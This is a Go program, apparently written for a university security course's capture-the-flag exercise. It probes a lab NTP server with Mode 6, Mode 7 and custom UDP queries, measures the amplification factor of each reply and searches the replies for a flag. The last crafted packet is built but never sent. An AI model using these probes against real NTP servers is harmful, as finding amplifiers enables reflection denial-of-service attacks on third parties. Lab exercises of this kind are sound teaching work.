package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

const (
	serverAddr = "cs177.seclab.cs.ucsb.edu:11294"
	timeout    = 5 * time.Second
)

func sendRequest(conn net.Conn, request []byte) ([]byte, error) {
	fmt.Println("Sending request:")
	fmt.Println(hex.Dump(request))

	_, err := conn.Write(request)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}

	response := make([]byte, 1500)
	n, err := conn.Read(response)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	fmt.Printf("Received %d bytes:\n", n)
	fmt.Println(hex.Dump(response[:n]))

	return response[:n], nil
}

func main() {
	conn, err := net.Dial("udp", serverAddr)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(timeout))

	// Try Mode 6 (Control) message with different request codes
	mode6Requests := [][]byte{
		{0x16, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00}, // Request code 2
		{0x16, 0x02, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00}, // Request code 3
		{0x16, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00}, // Request code 4
	}

	for _, request := range mode6Requests {
		request = append(request, make([]byte, 40)...)
		response, err := sendRequest(conn, request)
		if err != nil {
			fmt.Println(err)
		} else {
			checkAmplification(request, response)
		}
	}

	// Try custom TimeRequest command with different IPs
	timeRequests := []string{
		"TimeRequest 255.255.255.255",
		"TimeRequest 127.0.0.1",
		"TimeRequest 8.8.8.8",
	}

	for _, request := range timeRequests {
		response, err := sendRequest(conn, []byte(request))
		if err != nil {
			fmt.Println(err)
		} else {
			checkAmplification([]byte(request), response)
		}
	}

	// Try Mode 7 (Private) message with different request types
	mode7Requests := [][]byte{
		{0x17, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00}, // Request type 0
		{0x17, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00}, // Request type 1
		{0x17, 0x00, 0x03, 0x02, 0x00, 0x00, 0x00, 0x00}, // Request type 2
	}

	for _, request := range mode7Requests {
		request = append(request, make([]byte, 40)...)
		response, err := sendRequest(conn, request)
		if err != nil {
			fmt.Println(err)
		} else {
			checkAmplification(request, response)
		}
	}

	// Try a crafted NTP packet with specific fields set
	craftedRequest := make([]byte, 48)
	craftedRequest[0] = 0x1b                                    // LI = 0, VN = 3, Mode = 3 (client)
	binary.BigEndian.PutUint32(craftedRequest[4:8], 0xdeadbeef) // Transmit Timestamp
}

func checkAmplification(request, response []byte) {
	amplification := float64(len(response)) / float64(len(request))
	fmt.Printf("Sent %d bytes, received %d bytes\n", len(request), len(response))
	fmt.Printf("Amplification factor: %.2f\n", amplification)

	if amplification >= 9 {
		fmt.Println("Achieved required amplification factor!")
		checkForFlag(response)
	}
}

func checkForFlag(response []byte) {
	responseStr := string(response)
	if flagIndex := strings.Index(responseStr, "CS177{"); flagIndex != -1 {
		endIndex := strings.Index(responseStr[flagIndex:], "}") + flagIndex + 1
		if endIndex > flagIndex {
			fmt.Println("Flag found:", responseStr[flagIndex:endIndex])
		}
	}
}
